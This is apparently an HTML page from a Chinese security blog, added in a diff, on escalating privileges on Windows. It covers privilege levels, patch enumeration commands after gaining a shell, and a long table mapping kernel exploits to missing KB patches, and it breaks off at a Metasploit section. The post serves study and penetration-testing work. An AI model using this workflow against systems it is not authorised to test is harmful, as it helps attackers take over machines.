@@ -1,0 +1,728 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="reader-l">
+  <meta name="keywords" content="reader-l&#39;s blog">
+  <title>内网安全学习三-Windows系统提权 - reader-l&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.4.0/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"reader-l.github.io","root":"/","version":"1.8.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.3.0"><link rel="alternate" href="/atom.xml" title="reader-l's blog" type="application/atom+xml">
+</head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>reader-l's blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/Links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/List/">
+                <i class="iconfont icon-link-fill"></i>
+                List
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="内网安全学习三-Windows系统提权">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-03-06 15:54" pubdate>
+        2021年3月6日 下午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      6.1k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      75
+       分钟
+    </span>
+  
+
+  
+  
+    
+      <!-- 不蒜子统计文章PV -->
+      <span id="busuanzi_container_page_pv" style="display: none">
+        <i class="iconfont icon-eye" aria-hidden="true"></i>
+        <span id="busuanzi_value_page_pv"></span> 次
+      </span>
+    
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">内网安全学习三-Windows系统提权</h1>
+            
+              <p class="note note-info">
+                
+                  本文最后更新于：2021年3月28日 晚上
+                
+              </p>
+            
+            <div class="markdown-body">
+              <h1 id="1-Windows中的权限分类"><a href="#1-Windows中的权限分类" class="headerlink" title="1.Windows中的权限分类"></a>1.Windows中的权限分类</h1><p>1.User：普通用户权限，该组的默认权限不允许成员修改操作系统的设置或用户资料。</p>
+<p>2.Administrator：管理员权限。可以利用windows的机制将自己的权限提升为System权限，以便操作SAM文件。</p>
+<p>3.System：系统权限。可以对SAM等敏感文件进行读取，往往需要将Administrator权限提升到System权限才可以对散列值进行Dump操作。</p>
+<p>4.TrustedInstaller：Windows中的最高权限。对系统文件，即使拥有System权限也无法进行修改。</p>
+<p><strong>提权分为：纵向提权（由低权限—-&gt;）、横向提权（获取同级别的角色的权限，例如：在系统A获得系统B的权限）。</strong></p>
+<h1 id="2-提权方法一：系统内核溢出漏洞提权"><a href="#2-提权方法一：系统内核溢出漏洞提权" class="headerlink" title="2.提权方法一：系统内核溢出漏洞提权"></a>2.提权方法一：系统内核溢出漏洞提权</h1><p>​    这是最常用的一种提权方法，利用windows系统漏洞来绕过系统的所有安全限制。即使微软已经更新了补丁，但目标如果没有及时更新，攻击者还是可以加以利用。</p>
+<h2 id="1-通过手动执行命令发现缺失补丁"><a href="#1-通过手动执行命令发现缺失补丁" class="headerlink" title="1.通过手动执行命令发现缺失补丁"></a>1.通过手动执行命令发现缺失补丁</h2><p>​    获取目标机器的shell后，可以首先查看当前的权限：<code>whoami /groups</code></p>
+<p>​    可以看到当前的环境是标准用户，普通用户。</p>
+<p><img src="/2021/03/06/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B8%89-Windows%E7%B3%BB%E7%BB%9F%E6%8F%90%E6%9D%83/1.png" srcset="/img/loading.gif" alt="image-20210306161618256"></p>
+<p>​    执行<code>systeminfo</code>命令可以查看当前机器安装了哪些补丁，该命令是通过查看<code>C:\window\</code>里的补丁号（log文件）来了解系统上安装了哪些补丁。</p>
+<p>​    也可以利用wmic命令进行查询：</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">wmic qfe <span class="hljs-builtin-name">get</span> Caption,Description,HotFixID,InstalledOn<br></code></pre></td></tr></table></figure>
+<p>​    可以看到当前环境只安装了一个补丁。</p>
+<p><img src="/2021/03/06/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B8%89-Windows%E7%B3%BB%E7%BB%9F%E6%8F%90%E6%9D%83/2.png" srcset="/img/loading.gif"></p>
+<p>​    通过查看当前系统的安装了哪些补丁以及补丁号，我们可以来将其拿来和我们掌握的提权的EXP编号进行对比，选取当前并未安装补丁的对应的漏洞EXP来进行提权。</p>
+<p>​    比如如下的漏洞对应的补丁号并不在我们实验的环境中，因此可以将其拿来进行利用。</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">MS11</span>-<span class="hljs-number">011</span>----KB<span class="hljs-number">2393802</span><br><span class="hljs-attribute">MS11</span>-<span class="hljs-number">080</span>----KB<span class="hljs-number">2592799</span><br></code></pre></td></tr></table></figure>
+<p>常见的EXP可以看：<a target="_blank" rel="noopener" href="https://github.com/SecWiki/windows-kernel-exploits">https://github.com/SecWiki/windows-kernel-exploits</a></p>
+<p>这上面有许多的提权漏洞的EXP。</p>
+<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-tag">CVE-2020-0787</span> <span class="hljs-selector-attr">[Windows Background Intelligent Transfer Service Elevation of Privilege Vulnerability]</span> (Windows <span class="hljs-number">7</span>/<span class="hljs-number">8</span>/<span class="hljs-number">10</span>, <span class="hljs-number">2008</span>/<span class="hljs-number">2012</span>/<span class="hljs-number">2016</span>/<span class="hljs-number">2019</span>)<br><span class="hljs-selector-tag">CVE-2020-0796</span> <span class="hljs-selector-attr">[A remote code execution vulnerability exists in the way that the Microsoft Server Message Block 3.1.1 (SMBv3) protocol handles certain requests, aka &#x27;Windows SMBv3 Client/Server Remote Code Execution Vulnerability&#x27;]</span> (Windows <span class="hljs-number">1903</span>/<span class="hljs-number">1909</span>)<br><span class="hljs-selector-tag">CVE-2019-1458</span> <span class="hljs-selector-attr">[An elevation of privilege vulnerability exists in Windows when the Win32k component fails to properly handle objects in memory]</span> (Windows <span class="hljs-number">7</span>/<span class="hljs-number">8</span>/<span class="hljs-number">10</span>/<span class="hljs-number">2008</span>/<span class="hljs-number">2012</span>/<span class="hljs-number">2016</span>)<br><span class="hljs-selector-tag">CVE-2019-0803</span> <span class="hljs-selector-attr">[An elevation of privilege vulnerability exists in Windows when the Win32k component fails to properly handle objects in memory]</span> (Windows <span class="hljs-number">7</span>/<span class="hljs-number">8</span>/<span class="hljs-number">10</span>/<span class="hljs-number">2008</span>/<span class="hljs-number">2012</span>/<span class="hljs-number">2016</span>/<span class="hljs-number">2019</span>)<br><span class="hljs-selector-tag">CVE-2018-8639</span> <span class="hljs-selector-attr">[An elevation of privilege vulnerability exists in Windows when the Win32k component fails to properly handle objects in memory]</span> (Windows <span class="hljs-number">7</span>/<span class="hljs-number">8</span>/<span class="hljs-number">10</span>/<span class="hljs-number">2008</span>/<span class="hljs-number">2012</span>/<span class="hljs-number">2016</span>)<br><span class="hljs-selector-tag">CVE-2018-1038</span> <span class="hljs-selector-attr">[Windows Kernel Elevation of Privilege Vulnerability]</span> (Windows <span class="hljs-number">7</span> SP1/Windows Server <span class="hljs-number">2008</span> R2 SP1)<br><span class="hljs-selector-tag">CVE-2018-0743</span> <span class="hljs-selector-attr">[Windows Subsystem for Linux Elevation of Privilege Vulnerability]</span> (Windows <span class="hljs-number">10</span> version <span class="hljs-number">1703</span>/Windows <span class="hljs-number">10</span> version <span class="hljs-number">1709</span>/Windows Server version <span class="hljs-number">1709</span>)<br><span class="hljs-selector-tag">CVE-2018-8453</span> <span class="hljs-selector-attr">[An elevation of privilege vulnerability in Windows Win32k component]</span> (&gt;= windows <span class="hljs-number">8.1</span>)<br><span class="hljs-selector-tag">CVE-2018-8440</span> <span class="hljs-selector-attr">[Windows ALPC Elevation of Privilege Vulnerability]</span> (windows <span class="hljs-number">7</span>/<span class="hljs-number">8.1</span>/<span class="hljs-number">10</span>/<span class="hljs-number">2008</span>/<span class="hljs-number">2012</span>/<span class="hljs-number">2016</span>)<br><span class="hljs-selector-tag">MS17-017</span> 　<span class="hljs-selector-attr">[KB4013081]</span>　　<span class="hljs-selector-attr">[GDI Palette Objects Local Privilege Escalation]</span>　　(windows <span class="hljs-number">7</span>/<span class="hljs-number">8</span>)<br><span class="hljs-selector-tag">CVE-2017-8464</span> 　<span class="hljs-selector-attr">[LNK Remote Code Execution Vulnerability]</span>　　(windows <span class="hljs-number">10</span>/<span class="hljs-number">8.1</span>/<span class="hljs-number">7</span>/<span class="hljs-number">2016</span>/<span class="hljs-number">2010</span>/<span class="hljs-number">2008</span>)<br><span class="hljs-selector-tag">CVE-2017-0213</span> 　<span class="hljs-selector-attr">[Windows COM Elevation of Privilege Vulnerability]</span>　　(windows <span class="hljs-number">10</span>/<span class="hljs-number">8.1</span>/<span class="hljs-number">7</span>/<span class="hljs-number">2016</span>/<span class="hljs-number">2010</span>/<span class="hljs-number">2008</span>)<br><span class="hljs-selector-tag">CVE-2018-0833</span> <span class="hljs-selector-attr">[SMBv3 Null Pointer Dereference Denial of Service]</span>  (Windows <span class="hljs-number">8.1</span>/Server <span class="hljs-number">2012</span> R2)<br><span class="hljs-selector-tag">CVE-2018-8120</span> <span class="hljs-selector-attr">[Win32k Elevation of Privilege Vulnerability]</span> (Windows <span class="hljs-number">7</span> SP1/<span class="hljs-number">2008</span> SP2,<span class="hljs-number">2008</span> R2 SP1)<br><span class="hljs-selector-tag">MS17-010</span> 　<span class="hljs-selector-attr">[KB4013389]</span>　　<span class="hljs-selector-attr">[Windows Kernel Mode Drivers]</span>　　(windows <span class="hljs-number">7</span>/<span class="hljs-number">2008</span>/<span class="hljs-number">2003</span>/XP)<br><span class="hljs-selector-tag">MS16-135</span> 　<span class="hljs-selector-attr">[KB3199135]</span>　　<span class="hljs-selector-attr">[Windows Kernel Mode Drivers]</span>　　(<span class="hljs-number">2016</span>)<br><span class="hljs-selector-tag">MS16-111</span> 　<span class="hljs-selector-attr">[KB3186973]</span>　　<span class="hljs-selector-attr">[kernel api]</span>　　(Windows <span class="hljs-number">10</span> <span class="hljs-number">10586</span> (<span class="hljs-number">32</span>/<span class="hljs-number">64</span>)/<span class="hljs-number">8.1</span>)<br><span class="hljs-selector-tag">MS16-098</span> 　<span class="hljs-selector-attr">[KB3178466]</span>　　<span class="hljs-selector-attr">[Kernel Driver]</span>　　(Win <span class="hljs-number">8.1</span>)<br><span class="hljs-selector-tag">MS16-075</span> 　<span class="hljs-selector-attr">[KB3164038]</span>　　<span class="hljs-selector-attr">[Hot Potato]</span>　　(<span class="hljs-number">2003</span>/<span class="hljs-number">2008</span>/<span class="hljs-number">7</span>/<span class="hljs-number">8</span>/<span class="hljs-number">2012</span>)<br><span class="hljs-selector-tag">MS16-034</span> 　<span class="hljs-selector-attr">[KB3143145]</span>　　<span class="hljs-selector-attr">[Kernel Driver]</span>　　(<span class="hljs-number">2008</span>/<span class="hljs-number">7</span>/<span class="hljs-number">8</span>/<span class="hljs-number">10</span>/<span class="hljs-number">2012</span>)<br><span class="hljs-selector-tag">MS16-032</span> 　<span class="hljs-selector-attr">[KB3143141]</span>　　<span class="hljs-selector-attr">[Secondary Logon Handle]</span>　　(<span class="hljs-number">2008</span>/<span class="hljs-number">7</span>/<span class="hljs-number">8</span>/<span class="hljs-number">10</span>/<span class="hljs-number">2012</span>)<br><span class="hljs-selector-tag">MS16-016</span> 　<span class="hljs-selector-attr">[KB3136041]</span>　　<span class="hljs-selector-attr">[WebDAV]</span>　　(<span class="hljs-number">2008</span>/Vista/<span class="hljs-number">7</span>)<br><span class="hljs-selector-tag">MS16-014</span> 　<span class="hljs-selector-attr">[K3134228]</span>　　<span class="hljs-selector-attr">[remote code execution]</span>　　(<span class="hljs-number">2008</span>/Vista/<span class="hljs-number">7</span>)<br><span class="hljs-selector-tag">MS15-097</span> 　<span class="hljs-selector-attr">[KB3089656]</span>　　<span class="hljs-selector-attr">[remote code execution]</span>　　(win8.<span class="hljs-number">1</span>/<span class="hljs-number">2012</span>)<br><span class="hljs-selector-tag">MS15-076</span> 　<span class="hljs-selector-attr">[KB3067505]</span>　　<span class="hljs-selector-attr">[RPC]</span>　　(<span class="hljs-number">2003</span>/<span class="hljs-number">2008</span>/<span class="hljs-number">7</span>/<span class="hljs-number">8</span>/<span class="hljs-number">2012</span>)<br><span class="hljs-selector-tag">MS15-077</span> 　<span class="hljs-selector-attr">[KB3077657]</span>　　<span class="hljs-selector-attr">[ATM]</span>　　(XP/Vista/Win7/Win8/<span class="hljs-number">2000</span>/<span class="hljs-number">2003</span>/<span class="hljs-number">2008</span>/<span class="hljs-number">2012</span>)<br><span class="hljs-selector-tag">MS15-061</span> 　<span class="hljs-selector-attr">[KB3057839]</span>　　<span class="hljs-selector-attr">[Kernel Driver]</span>　　(<span class="hljs-number">2003</span>/<span class="hljs-number">2008</span>/<span class="hljs-number">7</span>/<span class="hljs-number">8</span>/<span class="hljs-number">2012</span>)<br><span class="hljs-selector-tag">MS15-051</span> 　<span class="hljs-selector-attr">[KB3057191]</span>　　<span class="hljs-selector-attr">[Windows Kernel Mode Drivers]</span>　　(<span class="hljs-number">2003</span>/<span class="hljs-number">2008</span>/<span class="hljs-number">7</span>/<span class="hljs-number">8</span>/<span class="hljs-number">2012</span>)<br><span class="hljs-selector-tag">MS15-015</span> 　<span class="hljs-selector-attr">[KB3031432]</span>　　<span class="hljs-selector-attr">[Kernel Driver]</span>　　(Win7/<span class="hljs-number">8</span>/<span class="hljs-number">8.1</span>/<span class="hljs-number">2012</span>/RT/<span class="hljs-number">2012</span> R2/<span class="hljs-number">2008</span> R2)<br><span class="hljs-selector-tag">MS15-010</span> 　<span class="hljs-selector-attr">[KB3036220]</span>　　<span class="hljs-selector-attr">[Kernel Driver]</span>　　(<span class="hljs-number">2003</span>/<span class="hljs-number">2008</span>/<span class="hljs-number">7</span>/<span class="hljs-number">8</span>)<br><span class="hljs-selector-tag">MS15-001</span> 　<span class="hljs-selector-attr">[KB3023266]</span>　　<span class="hljs-selector-attr">[Kernel Driver]</span>　　(<span class="hljs-number">2008</span>/<span class="hljs-number">2012</span>/<span class="hljs-number">7</span>/<span class="hljs-number">8</span>)<br><span class="hljs-selector-tag">MS14-070</span> 　<span class="hljs-selector-attr">[KB2989935]</span>　　<span class="hljs-selector-attr">[Kernel Driver]</span>　　(<span class="hljs-number">2003</span>)<br><span class="hljs-selector-tag">MS14-068</span> 　<span class="hljs-selector-attr">[KB3011780]</span>　　<span class="hljs-selector-attr">[Domain Privilege Escalation]</span>　　(<span class="hljs-number">2003</span>/<span class="hljs-number">2008</span>/<span class="hljs-number">2012</span>/<span class="hljs-number">7</span>/<span class="hljs-number">8</span>)<br><span class="hljs-selector-tag">MS14-058</span> 　<span class="hljs-selector-attr">[KB3000061]</span>　　<span class="hljs-selector-attr">[Win32k.sys]</span>　　(<span class="hljs-number">2003</span>/<span class="hljs-number">2008</span>/<span class="hljs-number">2012</span>/<span class="hljs-number">7</span>/<span class="hljs-number">8</span>)<br><span class="hljs-selector-tag">MS14-066</span> 　<span class="hljs-selector-attr">[KB2992611]</span>　　<span class="hljs-selector-attr">[Windows Schannel Allowing remote code execution]</span> (VistaSP2/<span class="hljs-number">7</span> SP1/<span class="hljs-number">8</span>/Windows <span class="hljs-number">8.1</span>/<span class="hljs-number">2003</span> SP2/<span class="hljs-number">2008</span> SP2/<span class="hljs-number">2008</span> R2 SP1/<span class="hljs-number">2012</span>/<span class="hljs-number">2012</span> R2/Windows RT/Windows RT <span class="hljs-number">8.1</span>)<br><span class="hljs-selector-tag">MS14-040</span> 　<span class="hljs-selector-attr">[KB2975684]</span>　　<span class="hljs-selector-attr">[AFD Driver]</span>　　(<span class="hljs-number">2003</span>/<span class="hljs-number">2008</span>/<span class="hljs-number">2012</span>/<span class="hljs-number">7</span>/<span class="hljs-number">8</span>)<br><span class="hljs-selector-tag">MS14-002</span> 　<span class="hljs-selector-attr">[KB2914368]</span>　　<span class="hljs-selector-attr">[NDProxy]</span>　　(<span class="hljs-number">2003</span>/XP)<br><span class="hljs-selector-tag">MS13-053</span> 　<span class="hljs-selector-attr">[KB2850851]</span>　　<span class="hljs-selector-attr">[win32k.sys]</span>　　(XP/Vista/<span class="hljs-number">2003</span>/<span class="hljs-number">2008</span>/win <span class="hljs-number">7</span>)<br><span class="hljs-selector-tag">MS13-046</span> 　<span class="hljs-selector-attr">[KB2840221]</span>　　<span class="hljs-selector-attr">[dxgkrnl.sys]</span>　　(Vista/<span class="hljs-number">2003</span>/<span class="hljs-number">2008</span>/<span class="hljs-number">2012</span>/<span class="hljs-number">7</span>)<br><span class="hljs-selector-tag">MS13-005</span> 　<span class="hljs-selector-attr">[KB2778930]</span>　　<span class="hljs-selector-attr">[Kernel Mode Driver]</span>　　(<span class="hljs-number">2003</span>/<span class="hljs-number">2008</span>/<span class="hljs-number">2012</span>/win7/<span class="hljs-number">8</span>)<br><span class="hljs-selector-tag">MS12-042</span> 　<span class="hljs-selector-attr">[KB2972621]</span>　　<span class="hljs-selector-attr">[Service Bus]</span>　　(<span class="hljs-number">2008</span>/<span class="hljs-number">2012</span>/win7)<br><span class="hljs-selector-tag">MS12-020</span> 　<span class="hljs-selector-attr">[KB2671387]</span>　　<span class="hljs-selector-attr">[RDP]</span>　　(<span class="hljs-number">2003</span>/<span class="hljs-number">2008</span>/<span class="hljs-number">7</span>/XP)<br><span class="hljs-selector-tag">MS11-080</span> 　<span class="hljs-selector-attr">[KB2592799]</span>　　<span class="hljs-selector-attr">[AFD.sys]</span>　　(<span class="hljs-number">2003</span>/XP)<br><span class="hljs-selector-tag">MS11-062</span> 　<span class="hljs-selector-attr">[KB2566454]</span>　　<span class="hljs-selector-attr">[NDISTAPI]</span>　　(<span class="hljs-number">2003</span>/XP)<br><span class="hljs-selector-tag">MS11-046</span> 　<span class="hljs-selector-attr">[KB2503665]</span>　　<span class="hljs-selector-attr">[AFD.sys]</span>　　(<span class="hljs-number">2003</span>/<span class="hljs-number">2008</span>/<span class="hljs-number">7</span>/XP)<br><span class="hljs-selector-tag">MS11-011</span> 　<span class="hljs-selector-attr">[KB2393802]</span>　　<span class="hljs-selector-attr">[kernel Driver]</span>　　(<span class="hljs-number">2003</span>/<span class="hljs-number">2008</span>/<span class="hljs-number">7</span>/XP/Vista)<br><span class="hljs-selector-tag">MS10-092</span> 　<span class="hljs-selector-attr">[KB2305420]</span>　　<span class="hljs-selector-attr">[Task Scheduler]</span>　　(<span class="hljs-number">2008</span>/<span class="hljs-number">7</span>)<br><span class="hljs-selector-tag">MS10-065</span> 　<span class="hljs-selector-attr">[KB2267960]</span>　　<span class="hljs-selector-attr">[FastCGI]</span>　　(IIS <span class="hljs-number">5.1</span>, <span class="hljs-number">6.0</span>, <span class="hljs-number">7.0</span>, and <span class="hljs-number">7.5</span>)<br><span class="hljs-selector-tag">MS10-059</span> 　<span class="hljs-selector-attr">[KB982799]</span>　　 <span class="hljs-selector-attr">[ACL-Churraskito]</span>　　(<span class="hljs-number">2008</span>/<span class="hljs-number">7</span>/Vista)<br><span class="hljs-selector-tag">MS10-048</span> 　<span class="hljs-selector-attr">[KB2160329]</span>　　<span class="hljs-selector-attr">[win32k.sys]</span>　　(XP SP2 &amp; SP3/<span class="hljs-number">2003</span> SP2/Vista SP1 &amp; SP2/<span class="hljs-number">2008</span> Gold &amp; SP2 &amp; R2/Win7)<br><span class="hljs-selector-tag">MS10-015</span> 　<span class="hljs-selector-attr">[KB977165]</span>　　 <span class="hljs-selector-attr">[KiTrap0D]</span>　　(<span class="hljs-number">2003</span>/<span class="hljs-number">2008</span>/<span class="hljs-number">7</span>/XP)<br><span class="hljs-selector-tag">MS10-012</span> 　<span class="hljs-selector-attr">[KB971468]</span>　　<span class="hljs-selector-attr">[SMB Client Trans2 stack overflow]</span>　　(Windows <span class="hljs-number">7</span>/<span class="hljs-number">2008</span>R2)<br><span class="hljs-selector-tag">MS09-050</span> 　<span class="hljs-selector-attr">[KB975517]</span>　　 <span class="hljs-selector-attr">[Remote Code Execution]</span>　　(<span class="hljs-number">2008</span>/Vista)<br><span class="hljs-selector-tag">MS09-020</span> 　<span class="hljs-selector-attr">[KB970483]</span>　　 <span class="hljs-selector-attr">[IIS 6.0]</span>　　(IIS <span class="hljs-number">5.1</span> and <span class="hljs-number">6.0</span>)<br><span class="hljs-selector-tag">MS09-012</span> 　<span class="hljs-selector-attr">[KB959454]</span>　　 <span class="hljs-selector-attr">[Chimichurri]</span>　　(Vista/win7/<span class="hljs-number">2008</span>/Vista)<br><span class="hljs-selector-tag">MS08-068</span> 　<span class="hljs-selector-attr">[KB957097]</span>　　 <span class="hljs-selector-attr">[Remote Code Execution]</span>　　(<span class="hljs-number">2000</span>/XP)<br><span class="hljs-selector-tag">MS08-067</span> 　<span class="hljs-selector-attr">[KB958644]</span>　　 <span class="hljs-selector-attr">[Remote Code Execution]</span>　　(Windows <span class="hljs-number">2000</span>/XP/Server <span class="hljs-number">2003</span>/Vista/Server <span class="hljs-number">2008</span>)<br><span class="hljs-selector-tag">MS08-066</span> 　<span class="hljs-selector-attr">[KB956803]</span>　　 <span class="hljs-selector-attr">[AFD.sys]</span>　　(Windows <span class="hljs-number">2000</span>/XP/Server <span class="hljs-number">2003</span>)<br><span class="hljs-selector-tag">MS08-025</span> 　<span class="hljs-selector-attr">[KB941693]</span>　　 <span class="hljs-selector-attr">[Win32.sys]</span>　　(XP/<span class="hljs-number">2003</span>/<span class="hljs-number">2008</span>/Vista)<br><span class="hljs-selector-tag">MS06-040</span> 　<span class="hljs-selector-attr">[KB921883]</span>　　 <span class="hljs-selector-attr">[Remote Code Execution]</span>　　(<span class="hljs-number">2003</span>/xp/<span class="hljs-number">2000</span>)<br><span class="hljs-selector-tag">MS05-039</span> 　<span class="hljs-selector-attr">[KB899588]</span>　　 <span class="hljs-selector-attr">[PnP Service]</span>　　(Win <span class="hljs-number">9</span>X/ME/NT/<span class="hljs-number">2000</span>/XP/<span class="hljs-number">2003</span>)<br><span class="hljs-selector-tag">MS03-026</span> 　<span class="hljs-selector-attr">[KB823980]</span>　　 <span class="hljs-selector-attr">[Buffer Overrun In RPC Interface]</span>　　(/NT/<span class="hljs-number">2000</span>/XP/<span class="hljs-number">2003</span>)<br></code></pre></td></tr></table></figure>
+<h2 id="2-利用Metasploit查看补丁信息"><a href="#2-利用Metasploit查看补丁信息" class="headerlink" title="2.利用Metasploit查看补丁信息"></a>2.利用Metasploit查看补丁信息</h2><p>​    如果我们当前拿到了shell，并将shell转到了MSF中，可以利用MSF自带的模块进行提权漏洞的缺少补丁的搜索。</p>
+<p><img src="/2021/03/06/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B8%89-Windows%E7%B3%BB%E7%BB%9F%E6%8F%90%E6%9D%83/3.png" srcset="/img/loading.gif"></p>
